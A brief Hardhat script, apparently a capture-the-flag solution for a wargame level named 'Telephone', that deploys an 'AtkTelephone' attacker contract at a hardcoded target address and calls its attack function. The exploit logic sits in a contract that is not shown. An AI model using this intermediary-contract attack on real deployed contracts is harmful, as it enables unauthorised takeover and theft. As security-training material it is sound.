// scripts/interact.js

const hre = require("hardhat");

async function main() {

    const TELEPHONE_ADDRESS = "0xc85932bF8D79269Db2a8FEa39B551994C756FaFC";  // Replace with the actual address


    // Step 1: Deploy the intermediary Attacker contract
    console.log("Deploying Attacker contract...");
    const Attacker = await hre.ethers.getContractFactory("AtkTelephone");
    const attackerInstance = await Attacker.deploy(TELEPHONE_ADDRESS);


    console.log("Attacker contract deployed at:", attackerInstance);

    // Step 2: Attack using the intermediary contract
    console.log("Attacking using the intermediary contract...");
    await attackerInstance.attack("0x1eAfC025a56ecA9d0880eE92Ad32944B10F1E3E8");


}

main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
